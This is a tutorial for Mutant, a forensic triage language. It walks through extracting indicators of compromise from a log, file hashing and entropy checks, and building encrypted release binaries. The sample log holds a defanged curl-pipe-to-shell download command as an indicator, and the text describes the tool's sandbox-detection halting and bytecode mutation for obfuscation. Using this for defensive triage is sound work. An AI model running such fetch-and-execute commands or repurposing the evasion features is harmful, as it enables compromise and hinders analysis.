# Mutant in 30 minutes

By the end of this you will have written a real triage program, run it against a
log file, turned it into an encrypted artifact, and built it into a standalone
binary you could hand to someone else. No prior exposure to the language is
assumed.

Everything below is a command that was run and an output that came back. Where
Mutant does something surprising, this page says so rather than routing around
it — the surprises are where the half-hour actually goes.

| | |
| --- | --- |
| **0–5 min** | [Install, and the first surprise](#1-install-and-the-first-surprise) |
| **5–10 min** | [The language on one page](#2-the-language-on-one-page) |
| **10–14 min** | [The one thing that will bite you](#3-the-one-thing-that-will-bite-you) |
| **14–20 min** | [A real program: indicators out of a log](#4-a-real-program-indicators-out-of-a-log) |
| **20–25 min** | [Triage a file, emit JSON](#5-triage-a-file-emit-json) |
| **25–27 min** | [Test, lint, format](#6-test-lint-format) |
| **27–30 min** | [Ship it](#7-ship-it) |

---

## 1. Install, and the first surprise

Clone and install:

```bash
git clone https://github.com/aoiflux/mutant
cd mutant
go build ./...
go install
```

That puts `mutant` on your `PATH`. Check it:

```bash
$ mutant --version
Version: 2.4.0
```

Now write a first program. Call it `hello.mut`:

```mutant
putln("hello from mutant");

let xs = [1, 2, 3];
putln(map(xs, fn(x) { return x * 2; }));
```

Run it:

```bash
$ mutant hello.mut
```

**It prints nothing.** This is the surprise, and it is the single most useful
thing to learn in the first five minutes:

> `mutant hello.mut` **compiles**. It does not run. It writes `hello.mu` — an
> encrypted, signed bytecode artifact — next to your source, and stops.

Running is the second step:

```bash
$ mutant hello.mu
hello from mutant
[2, 4, 6]
```

Both steps ask for a password, because the artifact is encrypted at rest: the
compile step prompts twice (set and confirm), the run step once. That is the
point of the toolchain, but it is friction you do not want while learning, so
while you are experimenting use `--dev`, which supplies a built-in development
key:

```bash
$ mutant --dev hello.mut && mutant --dev hello.mu
[dev] no password supplied; using the built-in development key -- not for release artifacts
hello from mutant
[2, 4, 6]
```

`--dev` is for local development only. It says so on every run, and the key it
uses is public. Everything from [§7](#7-ship-it) onward uses a real password.

For trying a single expression, skip files entirely — bare `mutant` starts a
REPL:

```bash
$ mutant
>> extract_iocs("call home to 203.0.113.44")["ipv4"]
```

### If it says "sandbox detected, execution halted"

Mutant's default mode refuses to run inside what it believes is an analysis
environment. That is deliberate — a signed forensic tool that happily executes
under a debugger is not much of a guarantee — but it can fire on a machine you
consider perfectly ordinary. Ask it what it saw:

```bash
$ mutant --dev prog.mu --log-level debug
[security-dev] sandbox detected=true type=WSL confidence=90 indicators=windows:process_parent:wsl,...
```

The `indicators` field names the evidence. Detection scores by confidence and
halts at 70. To get work done while you sort it out, `--compat` downgrades the
response from halt to warn:

```bash
$ mutant prog.mu --compat
```

> **Known false positive.** On Windows, launching `mutant` from **Git Bash**
> (or MSYS2/Cygwin) is scored as WSL at confidence 90, because the parent
> process is named `bash.exe` — the same name as the real WSL launcher. The
> same machine runs fine from PowerShell or `cmd`. If you see
> `windows:process_parent:wsl` and you are not in WSL, this is why.

---

## 2. The language on one page

Mutant is a small C-family language. If you have written JavaScript or Go you
can read it already.

```mutant
// Bindings. `let` introduces a name; assignment updates one.
let name = "svchost.exe";
let count = 0;
count += 1;

// Numbers, strings, booleans, null. Integers and floats are distinct.
let ratio = 7.9;
let packed = ratio > 7.2;         // true

// Arrays index from zero. Hashes are string-keyed.
let hosts = ["10.0.0.15", "203.0.113.44"];
let finding = {"host": hosts[1], "severity": "high"};
putln(finding["severity"]);        // high

// Conditionals and loops. `break` and `continue` work as you expect.
for (let i = 0; i < len(hosts); i++) {
    if (ip_is_private(hosts[i])) {
        continue;
    };
    putln("external:", hosts[i]);
};

// Functions are values, and they close over their surroundings.
let prefixer = fn(tag) {
    return fn(msg) { return tag + ": " + msg; };
};
let warn = prefixer("WARN");
putln(warn("beaconing"));          // WARN: beaconing

// Collections come with the usual higher-order functions.
let nums = [5, 3, 8, 1];
putln(map(nums, fn(x) { return x * 2; }));           // [10, 6, 16, 2]
putln(filter(nums, fn(x) { return x > 3; }));        // [5, 8]
putln(reduce(nums, fn(acc, x) { return acc + x; }, 0));  // 17
each(nums, fn(x) { putln(x); });
```

**Semicolons terminate statements**, including statements whose value is a
block — `let f = fn() { ... };` and, at the top level, `if (c) { ... };`. If you
forget one, `mutant lint` tells you exactly where.

`putln` prints its arguments and a newline; `putf` prints without one. Both take
any number of arguments and any types.

Two more declaration forms exist — `struct` and `enum` — plus compile-time
`macro`. You do not need them today;
[the language reference](MUTANT_LANGUAGE_REFERENCE.md) has them.

---

## 3. The one thing that will bite you

Anything that can fail returns **two** values: the result, and an error. You
bind both:

```mutant
let raw, err = fs_read("auth.log");
if (err) {
    putln("[error] fs_read:", err);
};
```

This convention runs through the whole standard library, and it is where a new
Mutant program goes wrong. Three facts, in the order you will trip over them.

**Not every builtin returns a pair.** `let a, b = ...` is a general destructuring
form, not error handling. Given an array on the right, it takes the array apart:

```mutant
let items = ["a", "b"];

let updated, err = push(items, "c");   // WRONG. push returns ONE array.
                                       // updated is "a"; err is "b"
let updated = push(items, "c");        // right: ["a", "b", "c"]
```

Nothing fails. `err` holds `"b"`, which is truthy, so an `if (err)` check even
appears to work — while `updated` silently holds a single letter. `push`,
`first`, `last`, `rest` and `len` all return one value. The
[Capability Reference](CAPABILITY_REFERENCE.md) gives every builtin's exact
return shape, and the language server flags this specific mistake as
`builtinSingleReturn` while you type.

**A missing hash key is null, not an error.** This is the same class of quiet
wrong answer:

```mutant
let digest, err = fs_hash("sample.bin", "sha256");
putln(digest["sha256"]);   // prints nothing -- there is no such key
putln(digest["hash"]);     // 21d44192269e9dac...
```

`fs_hash` returns `{algo, bytes, hash, path, size, status}`. The digest lives
under `hash`, whatever algorithm you asked for. Look up field names rather than
guessing them: every builtin's returned fields are listed in the Capability
Reference, and hovering the call in an editor with the language server shows the
same thing.

**Errors are values.** `err` is an object, not an exception; nothing unwinds.
A program that ignores an error carries on with whatever the first value was.

---

## 4. A real program: indicators out of a log

Save this as `auth.log`:

```
2026-08-14T02:11:09Z sshd[4412]: Failed password for admin from 203.0.113.44 port 51022
2026-08-14T02:11:44Z sshd[4412]: Accepted password for admin from 203.0.113.44 port 51022
2026-08-14T02:12:02Z cron[901]: (admin) CMD (curl -s hxxp://cdn.updates-cache[.]net/a.sh | sh)
2026-08-14T02:12:19Z sshd[4488]: Accepted publickey for root from 198.51.100.9 port 40122
2026-08-14T02:15:00Z audit: outbound 10.0.0.15 -> 203.0.113.44:443 established
```

Note the third line is **defanged** — `hxxp://` and `[.]` — the way indicators
are written in a report so nobody clicks them. Now `triage.mut`:

```mutant
let raw, err = fs_read("auth.log");
if (err) {
    putln("[error] fs_read:", err);
};

// extract_iocs refangs the text before matching, so defanged indicators are
// found too. It returns {ipv4, urls, domains, emails, md5, sha1, sha256}.
let iocs = extract_iocs(raw);

putln("external addresses:");
each(iocs["ipv4"], fn(ip) {
    if (!ip_is_private(ip)) {
        putln("  ", defang(ip));
    };
});

putln("callback urls:");
each(iocs["urls"], fn(url) {
    putln("  ", defang(url), "  host=", defang(domain_extract(url)));
});
```

```bash
$ mutant --dev triage.mut && mutant --dev triage.mu
external addresses:
  198[.]51[.]100[.]9
  203[.]0[.]113[.]44
callback urls:
  hxxp://cdn[.]updates-cache[.]net/a[.]sh   host=cdn[.]updates-cache[.]net
```

Three things worth noticing in fifteen lines:

- `extract_iocs` refanged the input, so the defanged URL was found anyway;
  `defang` put the indicators back into report-safe form on the way out.
- `ip_is_private` did the RFC1918 split, so `10.0.0.15` never reached the
  report.
- `domain_extract` pulled the host out of the URL. Prefer that over
  `iocs["domains"]` when you have a URL in hand: the domain matcher works on
  raw text and will also return path fragments that look like hostnames
  (`a.sh`, `svc.exe`).

That last point is the general lesson. These are pattern matchers over untrusted
text, not an oracle. Read what comes back.

---

## 5. Triage a file, emit JSON

A report that only prints is a report you cannot pipe anywhere. `filecheck.mut`:

```mutant
let inspect = fn(path) {
    let magic, magic_err = fs_magic(path);
    let digest, hash_err = fs_hash(path, "sha256");
    let ent, ent_err = fs_entropy(path);

    if (magic_err || hash_err || ent_err) {
        return {"path": path, "ok": false};
    };

    return {
        "path":    path,
        "ok":      true,
        "type":    magic["type"],
        "sha256":  digest["hash"],
        "entropy": ent["entropy"],
        "packed":  ent["entropy"] > 7.2,
    };
};

let report = inspect("sample.bin");
putln(report);

let out, err = json_stringify(report);
if (!err) {
    putln(out);
};
```

```bash
$ mutant --dev filecheck.mut && mutant --dev filecheck.mu
{entropy: 7.949850, ok: true, packed: true, path: sample.bin, sha256: 21d441…, type: unknown}
{"entropy":7.949849649923041,"ok":true,"packed":true,"path":"sample.bin","sha256":"21d441…","type":"unknown"}
```

`fs_magic` identifies the file from its header against a signature database
rather than trusting the extension. `fs_entropy` returns Shannon entropy —
above roughly 7.2 on a whole file means compressed, encrypted, or packed, which
is why the `packed` field is worth carrying. `json_stringify` gives you
something to hand to the rest of your pipeline.

Notice the shape of the error handling: three fallible calls, one combined
check, one early return with a result the caller can still inspect. Returning a
hash with `"ok": false` rather than dropping out entirely is the idiom worth
copying — a triage tool that silently skips a file is worse than one that says
it failed.

The whole forensic standard library is reached this way: 428 builtins across 33
categories, catalogued in the [Capability Reference](CAPABILITY_REFERENCE.md).
`fs_*` for files, `bin_*` for PE/ELF/Mach-O, `reg_*` for registry hives, `mft_*`
and the filesystem parsers for disk images, `evtx_*` and `prefetch_*` for
Windows artifacts, `net_*` for the wire. They all follow the conventions you
have already learned.

---

## 6. Test, lint, format

A test file is just a program whose last expression must be true. Name it
`*_test.mut`:

```mutant
// iocs_test.mut
let iocs = extract_iocs("beacon to 203.0.113.44 via hxxp://bad[.]example[.]com/x");

len(iocs["ipv4"]) == 1 && iocs["ipv4"][0] == "203.0.113.44";
```

```bash
$ mutant test .
ok    iocs_test.mut

1 passed, 0 failed
```

A test passes unless running it errors or its final value is `false`. That is
the whole framework — there are no assertions to learn.

The linter is the same analyzer the language server runs, so the command line
and your editor agree:

```bash
$ mutant lint triage.mut
$ mutant lint --strict examples/       # --strict also fails on warnings
```

It catches undefined identifiers, unused declarations, wrong builtin arity and
argument types, the `let x, err =` mistake from
[§3](#3-the-one-thing-that-will-bite-you), and calls to platform-restricted
builtins on an OS that does not support them.

There is also `mutant fmt`, a canonical formatter in the gofmt tradition — one
rendering per program, no options. Be aware before you run it on existing code:
its canonical form **parenthesises every operator expression**, so
`a + b * c` becomes `(a + (b * c))`, and it joins multi-line expressions back
onto one line. Most of the bundled examples are not written that way. Use
`--stdout` to see what it would do before letting it rewrite anything:

```bash
$ mutant fmt --stdout triage.mut
$ mutant fmt --check .                 # lists files it would change; exits non-zero
```

---

## 7. Ship it

You have been using `--dev` and a public key. Two commands turn the same source
into something you can actually hand over.

**An encrypted artifact.** This is the `.mu` from step 1, made properly:

```bash
$ mutant gen --src triage.mut --password-file ./case-42.key
Generating bytecode...
Compiled in: 29.7688ms
```

The recipient needs `mutant` and the password:

```bash
$ mutant triage.mu --password-file ./case-42.key
```

**A standalone binary.** No interpreter on the far end, no dependencies:

```bash
$ mutant release --src triage.mut --password-file ./case-42.key
Compiling release build...
$ ./triage.exe --password-file ./case-42.key
[security] self-verification only; add --signer-auth (with --trusted-key <path>) to verify against a trusted public key
external addresses:
  198[.]51[.]100[.]9
  203[.]0[.]113[.]44
```

Cross-compile with `--os` and `--arch`; raise obfuscation with `--mutation`,
which emits functionally identical but structurally different bytecode on every
build.

**The password still applies.** A release binary carries the payload encrypted;
it is not a way to ship a program that runs without the key. If you want the
recipient to verify who built it rather than only that it is intact, sign
against a trusted key and have them run with `--signer-auth --trusted-key`. The
line about "self-verification only" above is the runtime telling you honestly
that nobody asked it to check a signer.

**Never pass a password as a flag value.** `--password` puts the secret in the
process table and your shell history; it warns, and it is going away. The three
supported routes are an interactive prompt (the default), `--password-file`, and
`--password-stdin` for pipelines:

```bash
$ printf '%s' "$SECRET" | mutant gen --src triage.mut --password-stdin
```

---

## Where to go next

- **[Cookbook](COOKBOOK.md)** — the next step from here: fourteen complete
  programs organised by the question you are asking, not by builtin category.
- **[Capability Reference](CAPABILITY_REFERENCE.md)** — every builtin, its typed
  signature, its returned fields, and its platform support. Generated from the
  registry, so it cannot go stale.
- **[Language reference](MUTANT_LANGUAGE_REFERENCE.md)** — structs, enums,
  macros, concurrency (`spawn`, channels, `pmap`), and the `bytes` type for
  binary data.
- **[`examples/`](../examples/)** — 104 runnable programs grouped by subject.
  `examples/workshop/` is the closest thing to a continuation of this tutorial.
- **[What is Mutant?](WHAT_IS_MUTANT.md)** — why the language exists and what it
  is for.
- **[Why Mutant, and when not to](COMPARISON.md)** — the honest comparison
  against plaso, Velociraptor, osquery and YARA+Sigma.
- **[Security model](SECURITY_LLD.md)** — what the signing, encryption, tamper
  detection and mutation actually promise, and what they do not.

Install the VS Code extension for hover documentation, completion driven by the
same metadata as the reference above, inlay hints, and the diagnostics `mutant
lint` reports.
